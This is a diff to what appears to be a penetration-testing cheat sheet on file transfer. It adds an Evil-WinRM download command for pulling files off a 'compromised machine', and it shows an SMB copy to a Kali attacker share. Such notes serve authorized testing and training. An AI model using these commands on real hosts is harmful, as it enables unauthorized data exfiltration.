@@ -15,12 +15,15 @@ net use \\<kali-ip>\share /user:pt pt
 copy file.txt \\<kali-ip>\share\
 ```
 
-#### Evil-WinRM upload
+#### Evil-WinRM upload/download
 
 ```
 ## When we are inside a host in an internal network which we can't reach from the outside
 ## and we can't use the SMB protocol we can utilize evil-winrm native upload command
 upload /file/from/local/kali C:\Users\user\file.txt
+
+## Download a file from compromised machine to our machine
+download /path/to/remote/file
 ```
 
 ## Kali -> Windows
